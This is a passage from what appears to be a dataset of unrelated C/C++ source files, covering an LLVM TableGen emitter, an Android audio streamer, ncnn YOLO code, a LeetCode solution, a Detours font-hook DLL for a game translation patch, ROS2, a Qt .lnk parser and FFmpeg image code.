(coord::CInt)std::round(std::get<0>(pt)),\n//                (coord::CInt)std::round(std::get<1>(pt))\n//            });\n//        }\n//    }\n//\n//    std::vector<std::tuple<double, double>> get(int64_t index) {\n//        std::vector<std::tuple<double, double>> out;\n//        for (const auto &pt : p.at(get_index(index))) {\n//            out.push_back({\n//                pt.X / resolution,\n//                pt.Y / resolution\n//            });\n//        }\n//        re",
    "#include \"ast-tblgen/TableGenEmitter.hpp\"\n#include \"ast-tblgen/Printer.hpp\"\n#include \"llvm/Support/ErrorHandling.h\"\n#include \"llvm/Support/raw_ostream.h\"\n#include \"llvm/TableGen/Record.h\"\n#include <llvm-17/llvm/ADT/StringRef.h>\n\nnamespace astgen {\n\nstatic std::string makeFirstUppercase(StringRef str) {\n  return (std::string(1, str[0] - 32) + str.substr(1)).str();\n}\n\nvoid TableGenEmitter::Run(raw_ostream &OS) {\n  Printer printer(OS);\n\n  std::vector<Record *> ASTs = Records.getAllDerivedDefinitions(\"AST\");\n\n  SmallVector<Class *> asts;\n\n  DefineScope scope(OS, \"DECLARE_AST\");\n\n  for (auto *RC : ASTs) {\n    auto *newAST = CreateAST(RC);\n    if (!newAST)\n      return;\n    asts.emplace_back(newAST);\n  }\n\n  {\n    NamespaceScope nameScope(OS, \"ast\");\n    for (auto *C : asts)\n      C->print(printer);\n  }\n}\n\nClass *TableGenEmitter::CreateAST(Record *RC) {\n  auto className = RC->getName();\n\n  auto *treeData = RC->getValueAsDag(\"TreeData\");\n  assert(treeData && treeData->getOperator()->getAsString() == \"ins\");\n\n  const auto &[argName, tagName] = resolveTreeData(treeData);\n\n  SmallVector<Type *> memberTypes;\n  SmallVector<Type *> methodRetTypes;\n  memberTypes.reserve(argName.size());\n  memberTypes.reserve(argName.size());\n\n  for (const auto &tag : tagName) {\n    const auto &[memberT, retT, success] = getArgRetType(tag);\n    if (!success) {\n      llvm::errs() << \"Fails\" << '\\n';\n      return nullptr;\n    }\n    memberTypes.emplace_back(memberT);\n    methodRetTypes.emplace_back(retT);\n  }\n\n  auto *dataType = Ctx.alloc<Type>(\"std::tuple\", memberTypes);\n  auto *treeDataVar = Ctx.alloc<Var>(\"Data\", dataType);\n\n  SmallVector<Method *> getters;\n  getters.reserve(argName.size());\n\n  for (const auto &[arg, retT] : llvm::zip(argName, methodRetTypes)) {\n    auto getterName = \"get\" + makeFirstUppercase(arg);\n    auto *method =\n        Ctx.alloc<Method>(getterName, retT, std::nullopt, Method::Const);\n    getters.emplace_back(method);\n  }\n\n  SmallVector<std::variant<Method *, Var *>> regionData;\n  regionData.reserve(argName.size() + 1);\n\n  regionData.append(getters.begin(), getters.end());\n  regionData.emplace_back(treeDataVar);\n\n  auto *region = Ctx.alloc<Region>(true, regionData);\n\n  return Ctx.alloc<Class>(className, nullptr, region);\n}\n\nstd::tuple<Type *, Type *, bool>\nTableGenEmitter::getArgRetType(StringRef argType) {\n  if (argType == \"string\") {\n    auto *paramType = Ctx.alloc<Type>(\"std::string\", std::nullopt);\n    auto *retType = Ctx.alloc<Type>(\"llvm::StringRef\", std::nullopt);\n    return {paramType, retType, true};\n  } else {\n    return {nullptr, nullptr, false};\n  }\n}\n\nstd::pair<SmallVector<std::string>, SmallVector<std::string>>\nTableGenEmitter::resolveTreeData(DagInit *dag) {\n\n  SmallVector<std::string> argName;\n  SmallVector<std::string> tagName;\n\n  for (auto idx = 0; idx < dag->arg_size(); ++idx) {\n    auto arg = dag->getArg(idx)->getAsUnquotedString();\n    auto tag = dag->getArgName(idx)->getAsUnquotedString();\n    argName.emplace_back(arg);\n    tagName.emplace_back(tag);\n  }\n\n  return {argName, tagName};\n}\n\n} // namespace astgen\n",
    "/*\n * Copyright (C) 2022 LibreMobileOS Foundation\n *\n * Licensed under the Apache License, Version 2.0 (the \"License\");\n * you may not use this file except in compliance with the License.\n * You may obtain a copy of the License at\n *\n *      http://www.apache.org/licenses/LICENSE-2.0\n *\n * Unless required by applicable law or agreed to in writing, software\n * distributed under the License is distributed on an \"AS IS\" BASIS,\n * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n * See the License for the specific language governing permissions and\n * limitations under the License.\n */\n\n#define LOG_TAG \"audiostreamer\"\n\n#include \"socketmanager.h\"\n#include <android/content/AttributionSourceState.h>\n#include <cutils/log.h>\n#include <errno.h>\n#include <media/AudioRecord.h>\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <sys/select.h>\n#include <sys/types.h>\n#include <unistd.h>\n#include <jni.h>\n\nusing namespace android;\n\n#define kBufferOutputSize (1452)\n#define READ_AUDIO_MAX 2048\n#define DEFAULT_SOCKET_TCP_PORT (9200)\n#define DEFAULT_SOCKET_UNIX_NAME \"audiostreamer\"\n\nstatic char *gProgramName;\nstatic int gSocketTCPPort = DEFAULT_SOCKET_TCP_PORT;\nstatic bool gUsingSocketAndroid = false;\nstatic bool gUsingSocketUnix = false;\nstatic bool gRunning = false;\nstatic char *gSocketName;\nsp<AudioRecord> pAudioRecord = NULL;\n\nuint32_t sampleRate = 48000;\nint channel = 2;\n\nusing android::content::AttributionSourceState;\n\nstatic int audiostreamer_init() {\n    size_t framecount = 0;\n\n    AudioRecord::getMinFrameCount(&framecount, sampleRate, AUDIO_FORMAT_PCM_16_BIT, audio_channel_in_mask_from_count(channel));\n    ALOGI(\"%s: sampleRate: %d, channel: %d framecount: %d\", __FUNCTION__, sampleRate, channel, (int)framecount);\n\n    AttributionSourceState attributionSource;\n    attributionSource.packageName = \"com.libremobileos.vncflinger\";\n    attributionSource.token = sp<BBinder>::make();\n\n    pAudioRecord = new AudioRecord(AUDIO_SOURCE_REMOTE_SUBMIX, sampleRate, AUDIO_FORMAT_PCM_16_BIT,\n                                   audio_channel_in_mask_from_count(channel), attributionSource, framecount);\n\n    if (pAudioRecord == NULL) {\n        ALOGE(\"%s: create AudioRecord failed\", __FUNCTION__);\n        return -1;\n    }\n\n    if (pAudioRecord->initCheck() != OK) {\n        ALOGE(\"%s: init AudioRecord failed\", __FUNCTION__);\n        return -1;\n    }\n\n    return 0;\n}\n\nvoid audiostreamer_record_thread(void *arg) {\n    int err = 0;\n    char *pReadBuf = NULL;\n    int iReadLen = 0;\n    int nSock = 0;\n\n    if (NULL != arg) {\n        nSock = *((int *)arg);\n        ALOGI(\"%s: nSock:%d\", __FUNCTION__, nSock);\n    } else {\n        ALOGI(\"%s: NULL==arg, return.\", __FUNCTION__);\n        return;\n    }\n\n    if (pAudioRecord == NULL) {\n        err = audiostreamer_init();\n        if (err != 0) {\n            ALOGE(\"%s: create AudioRecord failed\", __FUNCTION__);\n            return;\n        }\n    }\n\n    pReadBuf = (char *) malloc(READ_AUDIO_MAX);\n    if (pReadBuf == NULL) {\n        ALOGE(\"%s: Failed to allocate memory\", __FUNCTION__);\n        return;\n    }\n\n    pAudioRecord->start();\n    while (gRunning) {\n        memset(pReadBuf, 0, READ_AUDIO_MAX);\n\n        iReadLen = pAudioRecord->read(pReadBuf, kBufferOutputSize);\n        if (iReadLen <= 0) {\n            ALOGE(\"%s: pAudioRecord->read failed\", __FUNCTION__);\n            continue;\n        }\n\n        if (!sendDataSocket(nSock, pReadBuf, iReadLen, 0)) break;\n    }\n\n    if (pAudioRecord != NULL) {\n        ALOGI(\"%s: pAudioRecord->stop\", __FUNCTION__);\n        pAudioRecord->stop();\n        if (pAudioRecord->stopped()) {\n            ALOGI(\"%s: pAudioRecord->stop end\", __FUNCTION__);\n        }\n    }\n\n    if (pReadBuf)\n        free(pReadBuf);\n\n    closeSocket(nSock);\n}\n\nvoid audiostreamer_create_thread() {\n    int sock = 0;\n    int sock_n = 0;\n\n    if (gUsingSocketAndroid)\n        sock = createAndroidSocket(DEFAULT_SOCKET_UNIX_NAME);\n    else if (gUsingSocketUnix)\n        sock = createUnixSocket(gSocketName);\n    else\n        sock = createTCPSocket(gSocketTCPPort);\n    if (sock <= 0) {\n        ALOGI(\"%s: Create socket failed!\", __FUNCTION__);\n        return;\n    }\n\n    // NO multitasking on PURPOSE\n    while (gRunning) {\n        sock_n = acceptSocket(sock);\n        if (sock_n > 0) {\n            audiostreamer_record_thread(&sock_n);\n        }\n    }\n}\n\nstatic int usage() {\n    fprintf(stderr, \"\\nUsage: %s [-T <Port>] or [<-U>] or [-u <Name>]\\n\", gProgramName);\n    fprintf(stderr,\n            \"\\n\"\n            \"-T: TCP socket (default port: %d)\\n\"\n            \"-U: Android control unix socket with name: %s\\n\"\n            \"-u: Unix socket (default: %s)\\n\",\n            DEFAULT_SOCKET_TCP_PORT, DEFAULT_SOCKET_UNIX_NAME, \"@\" DEFAULT_SOCKET_UNIX_NAME);\n    return 1;\n}\n\nint audio_main(int argc, char **argv) {\n    gRunning = true;\n    gProgramName = argv[0];\n    int i = 1;\n\n    if (argc < 2)\n        return usage();\n    while (i < argc) {\n        if (strcmp(argv[i], \"-T\") == 0) {\n       ",
    "#include \"rpisim/app/rpisim.hpp\"\n#include <thread>\n#include <unistd.h>\n\nRpiSim *rpisim;\n\nconstexpr int outputPinNumber = 3;  \nconstexpr int inputPinNumber = 5;\nconstexpr int timeToSleepLong = 500000;\nconstexpr int timeToSleepShort = 250000;\n\nstd::atomic<int> timeToSleep(timeToSleepLong);\nstd::atomic<bool> continueWork(true);\n\nvoid ledset_thread_function()\n{\n    bool buttonState = false;\n    while(continueWork)\n    {\n        rpisim->setPinState(outputPinNumber, (buttonState =!buttonState) ? true : false);\n        usleep(timeToSleep);\n    }\n}\n\nvoid button_thread_function()\n{\n    while(continueWork)\n    {\n        if(rpisim->getPinState(inputPinNumber))\n        {\n            timeToSleep = timeToSleepShort;\n        }\n        else\n        {\n            timeToSleep = timeToSleepLong;\n        }\n        usleep(10);\n    }\n}\n\nint main(void) \n{\n    rpisim = new RpiSim();\n    rpisim->setPinToOutput(outputPinNumber);\n    rpisim->setPinToInput(inputPinNumber);\n\n    std::thread ledSetThread(&ledset_thread_function);\n    std::thread buttonThread(&button_thread_function);\n\n    rpisim->run();\n    continueWork = false;\n\n    ledSetThread.join();\n    buttonThread.join();\n \n    return EXIT_SUCCESS;\n}\n\n\n\n\n",
    "// Tencent is pleased to support the open source community by making ncnn available.\n//\n// Copyright (C) 2021 THL A29 Limited, a Tencent company. All rights reserved.\n//\n// Licensed under the BSD 3-Clause License (the \"License\"); you may not use this file except\n// in compliance with the License. You may obtain a copy of the License at\n//\n// https://opensource.org/licenses/BSD-3-Clause\n//\n// Unless required by applicable law or agreed to in writing, software distributed\n// under the License is distributed on an \"AS IS\" BASIS, WITHOUT WARRANTIES OR\n// CONDITIONS OF ANY KIND, either express or implied. See the License for the\n// specific language governing permissions and limitations under the License.\n\n#include \"yolo.h\"\n\n#include <opencv2/core/core.hpp>\n#include <opencv2/imgproc/imgproc.hpp>\n\n#include <iomanip>\n\n#include \"cpu.h\"\n\nstatic float fast_exp(float x) {\n    union {\n        uint32_t i;\n        float f;\n    } v{};\n    v.i = (1 << 23) * (1.4426950409 * x + 126.93490512f);\n    return v.f;\n}\n\nstatic float sigmoid(float x) {\n    return 1.0f / (1.0f + fast_exp(-x));\n}\n\nstatic float intersection_area(const Object &a, const Object &b) {\n    cv::Rect_<float> inter = a.rect & b.rect;\n    return inter.area();\n}\n\nstatic void qsort_descent_inplace(std::vector<Object> &face_objects, int left, int right) {\n    int i = left;\n    int j = right;\n    float p = face_objects[(left + right) / 2].prob;\n\n    while (i <= j) {\n        while (face_objects[i].prob > p)\n            i++;\n\n        while (face_objects[j].prob < p)\n            j--;\n\n        if (i <= j) {\n            // swap\n            std::swap(face_objects[i], face_objects[j]);\n\n            i++;\n            j--;\n        }\n    }\n\n    //     #pragma omp parallel sections\n    {\n        //         #pragma omp section\n        {\n            if (left < j) qsort_descent_inplace(face_objects, left, j);\n        }\n        //         #pragma omp section\n        {\n            if (i < right) qsort_descent_inplace(face_objects, i, right);\n        }\n    }\n}\n\nstatic void qsort_descent_inplace(std::vector<Object> &face_objects) {\n    if (face_objects.empty())\n        return;\n\n    qsort_descent_inplace(face_objects, 0, face_objects.size() - 1);\n}\n\nstatic void nms_sorted_bboxes(const std::vector<Object> &face_objects, std::vector<int> &picked,\n                              float nms_threshold) {\n    picked.clear();\n\n    const int n = face_objects.size();\n\n    std::vector<float> areas(n);\n    for (int i = 0; i < n; i++) {\n        areas[i] = face_objects[i].rect.width * face_objects[i].rect.height;\n    }\n\n    for (int i = 0; i < n; i++) {\n        const Object &a = face_objects[i];\n\n        int keep = 1;\n        for (int j = 0; j < (int) picked.size(); j++) {\n            const Object &b = face_objects[picked[j]];\n\n            // intersection over union\n            float inter_area = intersection_area(a, b);\n            float union_area = areas[i] + areas[picked[j]] - inter_area;\n            // float IoU = inter_area / union_area\n            if (inter_area / union_area > nms_threshold)\n                keep = 0;\n        }\n\n        if (keep)\n            picked.push_back(i);\n    }\n}\n\nstatic void\ngenerate_grids_and_stride(const int target_w, const int target_h, std::vector<int> &strides,\n                          std::vector<GridAndStride> &grid_strides) {\n    for (int stride: strides) {\n        int num_grid_w = target_w / stride;\n        int num_grid_h = target_h / stride;\n        for (int g1 = 0; g1 < num_grid_h; g1++) {\n            for (int g0 = 0; g0 < num_grid_w; g0++) {\n                GridAndStride gs;\n                gs.grid0 = g0;\n                gs.grid1 = g1;\n                gs.stride = stride;\n                grid_strides.push_back(gs);\n            }\n        }\n    }\n}\n\nstatic void generate_proposals(std::vector<GridAndStride> grid_strides, const ncnn::Mat &pred,\n                               float prob_threshold, std::vector<Object> &objects, int num_class) {\n    const int num_points = grid_strides.size();\n    const int reg_max_1 = 16;\n\n    for (int i = 0; i < num_points; i++) {\n        const float *scores = pred.row(i) + 4 * reg_max_1;\n\n        // find label with max score\n        int label = -1;\n        float score = -FLT_MAX;\n        for (int k = 0; k < num_class; k++) {\n            float confidence = scores[k];\n            if (confidence > score) {\n                label = k;\n                score = confidence;\n            }\n        }\n        float box_prob = sigmoid(score);\n        if (box_prob >= prob_threshold) {\n            ncnn::Mat bbox_pred(reg_max_1, 4, (void *) pred.row(i));\n            {\n                ncnn::Layer *softmax = ncnn::create_layer(\"Softmax\");\n\n                ncnn::ParamDict pd;\n                pd.set(0, 1); // axis\n                pd.set(1, 1);\n                softmax->load_param(pd);\n\n                ncnn::Option opt;\n                opt.num_threads = 1;\n                opt.use_packing_layout = false;\n\n                softmax->create_pipeline(opt);\n\n",
    "// Roman numerals are represented by seven different symbols: I, V, X, L, C, D and M.\n\n// Symbol       Value\n// I             1\n// V             5\n// X             10\n// L             50\n// C             100\n// D             500\n// M             1000\n// For example, 2 is written as II in Roman numeral, just two ones added together. 12 is written as XII, which is simply X + II. The number 27 is written as XXVII, which is XX + V + II.\n\n// Roman numerals are usually written largest to smallest from left to right. However, the numeral for four is not IIII. Instead, the number four is written as IV. Because the one is before the five we subtract it making four. The same principle applies to the number nine, which is written as IX. There are six instances where subtraction is used:\n\n// I can be placed before V (5) and X (10) to make 4 and 9. \n// X can be placed before L (50) and C (100) to make 40 and 90. \n// C can be placed before D (500) and M (1000) to make 400 and 900.\n// Given a roman numeral, convert it to an integer.\n\n \n\n// Example 1:\n\n// Input: s = \"III\"\n// Output: 3\n// Explanation: III = 3.\n// Example 2:\n\n// Input: s = \"LVIII\"\n// Output: 58\n// Explanation: L = 50, V= 5, III = 3.\n// Example 3:\n\n// Input: s = \"MCMXCIV\"\n// Output: 1994\n// Explanation: M = 1000, CM = 900, XC = 90 and IV = 4.\n\n\nclass Solution {\npublic:\n    int romanToInt(string s) {\n        unordered_map<char, int> m;\n        \n        m['I'] = 1;\n        m['V'] = 5;\n        m['X'] = 10;\n        m['L'] = 50;\n        m['C'] = 100;\n        m['D'] = 500;\n        m['M'] = 1000;\n        \n        int ans = 0;\n        \n        for(int i = 0; i < s.length(); i++){\n            if(m[s[i]] < m[s[i+1]]){\n                ans -= m[s[i]];\n            }\n            else{\n                ans += m[s[i]];\n            }\n        }\n        return ans;\n    }\n};",
    "\ufeff#include <Windows.h>\n#include \"detours.h\"\n#pragma comment( lib, \"detours.lib\")\n\nextern void change_font();\n\nVOID __declspec(dllexport) stratmessage()\n{\n    //MessageBoxW(NULL, L\"\u672c\u8865\u4e01\u7531jyxjyx1234/ALyCE\u514d\u8d39\u5236\u4f5c\u5e76\u53d1\u5e03\u4e8egithub/2dfan\uff0c\u4f7f\u7528cluade-3-5-sonnet\u8fdb\u884c\u7ffb\u8bd1\uff0c\u4ec5\u4f9b\u4ea4\u6d41\u5b66\u4e60\u3002\u5982\u9047\u8fd0\u884c\u95ee\u9898\u53ef\u5230github\u62162dfan\u8865\u4e01\u8bc4\u8bba\u533a\u53cd\u9988\u3002\", NULL, NULL);\n}\n\n// \u539f\u59cb\u7684CreateFontIndirectA\u51fd\u6570\u6307\u9488\nstatic HFONT(WINAPI* Real_CreateFontIndirectA)(CONST LOGFONTA* lplf) = CreateFontIndirectA;\n\n// Hook\u51fd\u6570\nHFONT WINAPI Mine_CreateFontIndirectA(LOGFONTA* lplf)\n{\n    if (lplf != NULL)\n    {\n        lplf->lfCharSet = 0x86;\n        strncpy_s(lplf->lfFaceName, LF_FACESIZE, \"\u5b8b\u4f53\", _TRUNCATE);\n        lplf->lfFaceName[LF_FACESIZE - 1] = '\\0';\n    }\n    return Real_CreateFontIndirectA(lplf);\n}\n\nvoid change_font() {\n    DetourRestoreAfterWith();\n    DetourTransactionBegin();\n    DetourUpdateThread(GetCurrentThread());\n    DetourAttach(&(PVOID&)Real_CreateFontIndirectA, Mine_CreateFontIndirectA);\n    DetourTransactionCommit();\n}\n\nBOOL APIENTRY DllMain( HMODULE hModule,\n                       DWORD  ul_reason_for_call,\n                       LPVOID lpReserved\n                     )\n{\n    switch (ul_reason_for_call)\n    {\n    case DLL_PROCESS_ATTACH:\n        stratmessage();\n        change_font();\n        break;\n    case DLL_THREAD_ATTACH:\n        break;\n    case DLL_THREAD_DETACH:\n        break;\n    case DLL_PROCESS_DETACH:\n        break;\n    }\n    return TRUE;\n}\n\n",
    "#include <iostream>\n#include \"rclcpp/rclcpp.hpp\"\n#include \"std_msgs/msg/string.hpp\"\n#include <unistd.h> // include the header file for sleep()\n\n#include <string>\n#include <vector>\n\n#include \"publisher.h\"\n#include \"model_evaluation_subscriber.h\"\n#include \"rclcpp/time_source.hpp\"\n\nusing namespace std;\n\nusing namespace synchronizer;\n\nint main(int argc, char * argv[])\n{\n    int channel_num = atoi(argv[1]);\n    int lower_limit = atoi(argv[2]);\n\n    rclcpp::init(argc, argv);\n    rclcpp::executors::SingleThreadedExecutor executor;\n    // rclcpp::executors::MultiThreadedExecutor executor(rclcpp::ExecutorOptions(),50);\n    \n    unsigned seed = std::chrono::system_clock::now().time_since_epoch().count();\n    default_random_engine gen(seed);\n    uniform_int_distribution<unsigned> perd(lower_limit, 100);\n    \n    std::vector<std::shared_ptr<Publisher>> pub_nodes;\n\n    for (int i = 0 ; i<channel_num ; ++i) {\n        int real_period = perd(gen);\n        pub_nodes.push_back(std::make_shared<Publisher>(\"topic\"+to_string(i+1), real_period));\n    }\n\n    rclcpp::TimeSource time_source;\n    auto sync_clock = std::make_shared<rclcpp::Clock>(RCL_ROS_TIME);\n    for (int i = 0 ; i<channel_num ; ++i)\n        time_source.attachNode(pub_nodes[i]);\n    time_source.attachClock(sync_clock);\n\n    auto sub_node3 = std::make_shared<SubscriberTopic3>(sync_clock);\n    auto sub_node4 = std::make_shared<SubscriberTopic4>(sync_clock);\n    auto sub_node5 = std::make_shared<SubscriberTopic5>(sync_clock);\n    auto sub_node6 = std::make_shared<SubscriberTopic6>(sync_clock);\n    auto sub_node7 = std::make_shared<SubscriberTopic7>(sync_clock);\n    auto sub_node8 = std::make_shared<SubscriberTopic8>(sync_clock);\n    auto sub_node9 = std::make_shared<SubscriberTopic9>(sync_clock);\n    switch (channel_num) {\n        case 3:\n            executor.add_node(sub_node3);\n            break;\n        case 4:\n            executor.add_node(sub_node4);\n            break;\n        case 5:\n            executor.add_node(sub_node5);\n            break;\n        case 6:\n            executor.add_node(sub_node6);\n            break;\n        case 7:\n            executor.add_node(sub_node7);\n            break;\n        case 8:\n            executor.add_node(sub_node8);\n            break;\n        case 9:\n            executor.add_node(sub_node9);\n            break;\n    }\n\n    for (int i = 0 ; i<channel_num ; ++i)\n        executor.add_node(pub_nodes[i]);\n\n    executor.spin();\n\n\n    rclcpp::shutdown();\n    return 0;\n}\n\n",
    "#include \"mainwindow.h\"\n#include \"lnk.h\"\n#include \"ui_mainwindow.h\"\n#include <QFileDialog>\n#include <QMessageBox>\n#include <QString>\n#include <QUuid>\n#include <bitset>\n#include <ranges>\n\nMainWindow::MainWindow(QWidget *parent)\n    : QMainWindow(parent), ui(new Ui::MainWindow) {\n  ui->setupUi(this);\n\n  connect(ui->browse, &QPushButton::clicked, this,\n          [&] { this->onBrowseFile(ui->selectFileToParse); });\n  connect(ui->selectFileToParse, &QLineEdit::textChanged, this,\n          &MainWindow::updateParseTab);\n}\n\nvoid MainWindow::updateParseTab() {\n  auto path = ui->selectFileToParse->text();\n  auto file = QFile(path, this);\n\n  if (file.open(QFile::ReadOnly) == false) {\n    QMessageBox::critical(this, tr(\"Error\"), tr(\"Can not open lnk file.\"));\n    return;\n  }\n\n  auto buffer = file.readAll();\n\n  updateAllField(buffer.data());\n}\n\nvoid MainWindow::onBrowseFile(QLineEdit *output) {\n  auto path = QFileDialog::getOpenFileName(this, QString(), QString(),\n                                           tr(\"Lnk Files (*.lnk)\"));\n\n  output->setText(path);\n}\n\nvoid MainWindow::updateAllField(void *buffer) {\n  auto header = (ShellLinkHeader *)buffer;\n\n  if (header->size != 76) {\n    QMessageBox::critical(this, tr(\"Error\"), tr(\"Not a valid lnk file.\"));\n    return;\n  }\n\n  // TODO: Add class identifier validation\n\n  const uint64_t UNIX_EPOCH_IN_FILETIME = 116444736000000000ULL;\n  auto creation_date = QDateTime::fromSecsSinceEpoch(\n      (header->creation_time - UNIX_EPOCH_IN_FILETIME) / 10000000,\n      QTimeZone::UTC);\n  auto access_date = QDateTime::fromSecsSinceEpoch(\n      (header->access_time - UNIX_EPOCH_IN_FILETIME) / 10000000,\n      QTimeZone::UTC);\n  auto modification_date = QDateTime::fromSecsSinceEpoch(\n      (header->modification_time - UNIX_EPOCH_IN_FILETIME) / 10000000,\n      QTimeZone::UTC);\n  auto target_file_size = (double)header->file_size / 1024;\n  auto icon_index = header->icon_index;\n  auto show_window = parseShowWindow(header->show_window);\n  auto [hot_key_1, hot_key_2] = this->parseHotKey(header->hot_key);\n  auto link_flag = std::bitset<32>(header->flags);\n  auto file_attributes = std::bitset<32>(header->file_attributes);\n\n  ui->creationDate->setText(creation_date.toString());\n  ui->accessDate->setText(access_date.toString());\n  ui->modificationDate->setText(modification_date.toString());\n  ui->targetFileSize->setText(QString::number(target_file_size).append(\" KB\"));\n  ui->iconIndex->setText(QString::number(icon_index));\n  ui->showType->setText(show_window);\n  ui->hotKey->setText(tr(\"%2 + %1\").arg(hot_key_1).arg(hot_key_2));\n  for (auto i = 0; i <= 26; i++) {\n    ui->linkFlags->item(i)->setCheckState(link_flag.test(i) ? Qt::Checked\n                                                            : Qt::Unchecked);\n  }\n  for (auto i = 0; i <= 14; i++) {\n    ui->fileAttributes->item(i)->setCheckState(\n        file_attributes.test(i) ? Qt::Checked : Qt::Unchecked);\n  }\n\n  buffer = movePointer(buffer, header->size);\n  auto has_link_target_id_list = link_flag.test(0);\n  auto has_link_info = link_flag.test(1);\n  auto has_name = link_flag.test(2);\n  auto has_relative_path = link_flag.test(3);\n  auto has_working_dir = link_flag.test(4);\n  auto has_arguments = link_flag.test(5);\n  auto has_icon_location = link_flag.test(6);\n  // auto is_unicode = link_flag.test(7);\n  // auto force_no_link_info = link_flag.test(8);\n  // auto has_exp_string = link_flag.test(9);\n  // auto run_in_separate_process = link_flag.test(10);\n  // auto unused1 = link_flag.test(11);\n  // auto has_darwin_id = link_flag.test(12);\n  // auto run_as_user = link_flag.test(13);\n  // auto has_exp_icon = link_flag.test(14);\n  // auto no_pidl_alias = link_flag.test(15);\n  // auto unused2 = link_flag.test(16);\n  // auto run_with_shim_layer = link_flag.test(17);\n  // auto force_no_link_track = link_flag.test(18);\n  // auto enable_target_metadata = link_flag.test(19);\n  // auto disable_link_path_tracking = link_flag.test(20);\n  // auto disable_known_folder_tracking = link_flag.test(21);\n  // auto disable_known_folder_alias = link_flag.test(22);\n  // auto allow_link_to_link = link_flag.test(23);\n  // auto unalias_on_save = link_flag.test(24);\n  // auto prefer_environment_path = link_flag.test(25);\n  // auto keep_local_id_list_for_unc_target = link_flag.test(26);\n\n  if (has_link_target_id_list == true) {\n    buffer = movePointer(buffer, this->updateLinkTargetIdListField(buffer));\n  }\n\n  if (has_link_info == true) {\n    buffer = movePointer(buffer, this->updateLinkInfoField(buffer));\n  }\n\n  ui->description->setEnabled(has_name);\n  if (has_name == true) {\n    buffer = movePointer(buffer,\n                         this->updateStringFieldUtf16(buffer, ui->description));\n  }\n\n  ui->relativePath->setEnabled(has_relative_path);\n  if (has_relative_path == true) {\n    buffer = movePointer(\n        buffer, this->updateStringFieldUtf16(buffer, ui->relativePath));\n  }\n\n  ui->workingDir->setEnabled(has_working_dir);\n  if (has_working_dir == true) {\n    buffer = movePointer(",
    "#include <iostream>\n#include <opencv2/opencv.hpp>\n#include <chrono>\n\nextern \"C\" {\n    #include <libavcodec/avcodec.h>\n    #include <libavformat/avformat.h>\n    #include <libswscale/swscale.h>\n    #include <libavutil/imgutils.h>\n}\n\n// Initialize FFmpeg context for decoding an image\nvoid initFFmpegContext(const std::string& imageFile, AVFormatContext*& pFormatCtx, AVCodecContext*& pCodecCtx, int& videoStream) {\n    pFormatCtx = avformat_alloc_context();\n    if (avformat_open_input(&pFormatCtx, imageFile.c_str(), NULL, NULL) != 0) {\n        std::cerr << \"Couldn't open file \" << imageFile << \".\\n\";\n        exit(-1);\n    }\n\n    if (avformat_find_stream_info(pFormatCtx, NULL) < 0) {\n        std::cerr << \"Couldn't find stream information for \" << imageFile << \".\\n\";\n        exit(-1);\n    }\n\n    videoStream = -1;\n    for (unsigned i = 0; i < pFormatCtx->nb_streams; i++) {\n        if (pFormatCtx->streams[i]->codecpar->codec_type == AVMEDIA_TYPE_VIDEO) {\n            videoStream = i;\n            break;\n        }\n    }\n\n    if (videoStream == -1) {\n        std::cerr << \"Didn't find a video stream in \" << imageFile << \".\\n\";\n        exit(-1);\n    }\n\n    AVCodecParameters *pCodecPar = pFormatCtx->streams[videoStream]->codecpar;\n    const AVCodec *pCodec = avcodec_find_decoder(pCodecPar->codec_id);\n    if (pCodec == NULL) {\n        std::cerr << \"Unsupported codec in \" << imageFile << \"!\\n\";\n        exit(-1);\n    }\n\n    pCodecCtx = avcodec_alloc_context3(pCodec);\n    if (avcodec_parameters_to_context(pCodecCtx, pCodecPar) < 0) {\n        std::cerr << \"Couldn't copy codec context for \" << imageFile << \".\\n\";\n        exit(-1);\n    }\n\n    if (avcodec_open2(pCodecCtx, pCodec, NULL) < 0) {\n        std::cerr << \"Couldn't open codec for \" << imageFile << \".\\n\";\n        exit(-1);\n    }\n}\n\n// Load a frame from the image\nbool loadImageFrame(AVFormatContext* pFormatCtx, AVCodecContext* pCodecCtx, int videoStream, cv::Mat& img) {\n    AVFrame *pFrame = av_frame_alloc();\n    AVFrame *pFrameGray = av_frame_alloc();\n    if (!pFrameGray) {\n        exit(-1);\n    }\n\n\n\n\n    uint8_t *buffer = (uint8_t *)av_malloc(av_image_get_buffer_size(AV_PIX_FMT_GRAY8, pCodecCtx->width, pCodecCtx->height, 1));\n    av_image_fill_arrays(pFrameGray->data, pFrameGray->linesize, buffer, AV_PIX_FMT_GRAY8, pCodecCtx->width, pCodecCtx->height, 1);\n\n    struct SwsContext *sws_ctx = sws_getContext(pCodecCtx->width,\n                                                pCodecCtx->height,\n                                                pCodecCtx->pix_fmt,\n                                                pCodecCtx->width,\n                                                pCodecCtx->height,\n                                                AV_PIX_FMT_GRAY8,\n                                                SWS_BILINEAR,\n                                                NULL, NULL, NULL);\n\n    AVPacket packet;\n    bool frameLoaded = false;\n\n    while (av_read_frame(pFormatCtx, &packet) >= 0) {\n        if (packet.stream_index == videoStream) {\n            avcodec_send_packet(pCodecCtx, &packet);\n            if (avcodec_receive_frame(pCodecCtx, pFrame) == 0) {\n                sws_scale(sws_ctx, (uint8_t const * const *)pFrame->data,\n                          pFrame->linesize, 0, pCodecCtx->height,\n                          pFrameGray->data, pFrameGray->linesize);\n\n                img = cv::Mat(pCodecCtx->height, pCodecCtx->width, CV_8UC1, pFrameGray->data[0], pFrameGray->linesize[0]).clone();\n                frameLoaded = true;\n                break;\n            }\n        }\n        av_packet_unref(&packet);\n    }\n\n    if (!frameLoaded) {\n        std::cerr << \"Failed to load frame from image.\\n\";\n    }\n\n    sws_freeContext(sws_ctx);\n    av_free(buffer);\n    av_frame_free(&pFrameGray);\n    av_frame_free(&pFrame);\n\n    return frameLoaded;\n}\n\n// Generate grayscale noise frames\nstd::vector<cv::Mat> generateNoiseFrames(int width, int height, int numFrames) {\n    std::vector<cv::Mat> noiseFrames;\n    for (int i = 0; i < numFrames; ++i) {\n        cv::Mat noise(height, width, CV_8UC1);\n        cv::randu(noise, cv::Scalar(0), cv::Scalar(255));\n        noiseFrames.push_back(noise);\n    }\n    return noiseFrames;\n}\n\nint main() {\n\n    std::string imageFile = \"/home/jim/Desktop/PiTests/images/image.jpg\"; // Path to your image file\n\n    AVFormatContext *pFormatCtx;\n    AVCodecContext *pCodecCtx;\n    int videoStream;\n\n    initFFmpegContext(imageFile, pFormatCtx, pCodecCtx, videoStream);\n\n    cv::Mat img, blendedImg;\n    if (!loadImageFrame(pFormatCtx, 